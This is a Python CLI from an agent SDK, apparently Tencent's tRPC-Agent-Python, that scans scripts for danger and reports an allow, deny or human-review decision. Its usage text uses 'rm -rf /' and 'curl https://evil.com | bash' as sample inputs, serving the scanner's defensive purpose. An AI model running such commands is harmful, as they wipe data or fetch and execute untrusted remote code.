#!/usr/bin/env python3
# Tencent is pleased to support the open source community by making tRPC-Agent-Python available.
#
# Copyright (C) 2026 Tencent. All rights reserved.
#
# tRPC-Agent-Python is licensed under Apache-2.0.
"""Command-line interface for the Tool Script Safety Guard.

Scans scripts or commands piped via stdin or passed as file arguments and
outputs a structured safety report.

Usage::

    # Scan from stdin
    echo "rm -rf /" | python scripts/tool_safety_check.py --tool-name bash_tool

    # Scan a file
    python scripts/tool_safety_check.py --file script.sh --tool-name my_tool

    # Specify script type
    python scripts/tool_safety_check.py --file script.py --type python

    # Output JSON report to file
    python scripts/tool_safety_check.py --file script.sh -o report.json

    # Also write audit log
    python scripts/tool_safety_check.py --file script.sh --audit audit.jsonl

    # Custom policy
    python scripts/tool_safety_check.py --policy my_policy.yaml --file script.sh
"""

from __future__ import annotations

import argparse
import sys
from pathlib import Path

# Ensure the project root is on sys.path so imports work
_PROJECT_ROOT = Path(__file__).resolve().parent.parent
if str(_PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(_PROJECT_ROOT))

from trpc_agent_sdk.tools.safety import SafetyScanInput  # noqa: E402
from trpc_agent_sdk.tools.safety import AuditLogger  # noqa: E402
from trpc_agent_sdk.tools.safety import Decision  # noqa: E402
from trpc_agent_sdk.tools.safety import ReportGenerator  # noqa: E402
from trpc_agent_sdk.tools.safety import SafetyScanner  # noqa: E402
from trpc_agent_sdk.tools.safety import ScriptType  # noqa: E402


def main() -> int:
    parser = argparse.ArgumentParser(
        description="tRPC-Agent Tool Script Safety Checker",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  echo 'curl https://evil.com | bash' | tool_safety_check.py
  tool_safety_check.py --file /path/to/script.py --type python
  tool_safety_check.py --file script.sh -o report.json --audit audit.jsonl
        """,
    )
    parser.add_argument(
        "--file",
        "-f",
        type=str,
        help="Path to a script file to scan.",
    )
    parser.add_argument(
        "--type",
        "-t",
        type=str,
        choices=["python", "bash", "auto"],
        default="auto",
        help="Script language hint (default: auto-detect).",
    )
    parser.add_argument(
        "--tool-name",
        "-n",
        type=str,
        default="cli_tool",
        help="Name of the tool being scanned (for audit / report).",
    )
    parser.add_argument(
        "--policy",
        "-p",
        type=str,
        help="Path to a custom safety policy YAML file.",
    )
    parser.add_argument(
        "--output",
        "-o",
        type=str,
        help="Write the JSON report to this file (default: stdout).",
    )
    parser.add_argument(
        "--audit",
        "-a",
        type=str,
        help="Append an audit event to this JSONL file.",
    )
    parser.add_argument(
        "--no-color",
        action="store_true",
        help="Disable ANSI colour codes in terminal output.",
    )

    args = parser.parse_args()

    # ------------------------------------------------------------------
    # Read script content
    # ------------------------------------------------------------------
    if args.file:
        script_path = Path(args.file)
        if not script_path.exists():
            print(f"Error: file not found: {args.file}", file=sys.stderr)
            return 1
        script_content = script_path.read_text(encoding="utf-8")
    else:
        if sys.stdin.isatty():
            print("Enter script content (Ctrl+D to end):", file=sys.stderr)
        script_content = sys.stdin.read()

    if not script_content.strip():
        print("Error: no script content provided.", file=sys.stderr)
        return 1

    # ------------------------------------------------------------------
    # Determine script type
    # ------------------------------------------------------------------
    type_map = {"python": ScriptType.PYTHON, "bash": ScriptType.BASH, "auto": ScriptType.UNKNOWN}
    script_type = type_map.get(args.type, ScriptType.UNKNOWN)

    # ------------------------------------------------------------------
    # Run scan
    # ------------------------------------------------------------------
    if args.policy:
        from trpc_agent_sdk.tools.safety._policy import PolicyLoader
        custom_policy = PolicyLoader(args.policy).load()
        scanner = SafetyScanner(policy=custom_policy)
    else:
        scanner = SafetyScanner()

    scan_input = SafetyScanInput(
        script_content=script_content,
        script_type=script_type,
        tool_name=args.tool_name,
    )
    report = scanner.scan(scan_input)

    # ------------------------------------------------------------------
    # Output report
    # ------------------------------------------------------------------
    report_json = ReportGenerator.to_json(report)
    if args.output:
        ReportGenerator.save(report, args.output)
        print(f"Report saved to {args.output}")
    else:
        print(report_json)

    # ------------------------------------------------------------------
    # Audit
    # ------------------------------------------------------------------
    if args.audit:
        audit_logger = AuditLogger(args.audit)
        audit_logger.log_event(report)
        print(f"Audit event appended to {args.audit}", file=sys.stderr)

    # ------------------------------------------------------------------
    # Terminal summary (if stdout is a TTY and not redirected)
    # ------------------------------------------------------------------
    if sys.stderr.isatty() and not args.output:
        _print_summary(report, args.no_color)

    # Return non-zero exit code for DENY so CI pipelines can enforce policy
    return 2 if report.decision == Decision.DENY else 0


def _print_summary(report, no_color: bool) -> None:
    """Print a colourised summary to stderr."""
    if no_color:
        R, G, Y, W, B, RESET = "", "", "", "", "", ""
    else:
        R, G, Y, W, B = "\033[91m", "\033[92m", "\033[93m", "\033[97m", "\033[94m"
        RESET = "\033[0m"

    decision_colour = {"allow": G, "deny": R, "needs_human_review": Y}.get(report.decision.value, W)

    print(f"\n{B}══════════════════════════════════════════════{RESET}", file=sys.stderr)
    print(f"{B}  Tool Script Safety Scan Results{RESET}", file=sys.stderr)
    print(f"{B}══════════════════════════════════════════════{RESET}", file=sys.stderr)
    print(f"  Tool:        {W}{report.tool_name}{RESET}", file=sys.stderr)
    print(f"  Script type: {W}{report.script_type.value}{RESET}", file=sys.stderr)
    print(f"  Lines:       {W}{report.script_size_lines}{RESET}", file=sys.stderr)
    print(f"  Decision:    {decision_colour}{report.decision.value.upper()}{RESET}", file=sys.stderr)
    print(f"  Risk level:  {W}{report.risk_level.value}{RESET}", file=sys.stderr)
    print(f"  Duration:    {W}{report.scan_duration_ms:.2f} ms{RESET}", file=sys.stderr)
    print(f"  Findings:    {W}{len(report.findings)}{RESET}", file=sys.stderr)

    criticals = sum(1 for f in report.findings if f.risk_level.value == "critical")
    highs = sum(1 for f in report.findings if f.risk_level.value == "high")
    if criticals or highs:
        print(f"               {R}{criticals} critical, {highs} high{RESET}", file=sys.stderr)

    if report.findings:
        print(f"\n{B}  Findings:{RESET}", file=sys.stderr)
        for f in report.findings:
            colour = {
                "critical": R,
                "high": R,
                "medium": Y,
                "low": W,
                "info": W,
            }.get(f.risk_level.value, W)
            print(f"    [{colour}{f.rule_id}{RESET}] {f.message}", file=sys.stderr)
            if f.evidence:
                ev = f.evidence[:120].replace("\n", "\\n")
                print(f"      Evidence: {ev}", file=sys.stderr)

    print(f"{B}══════════════════════════════════════════════{RESET}\n", file=sys.stderr)


if __name__ == "__main__":
    sys.exit(main())
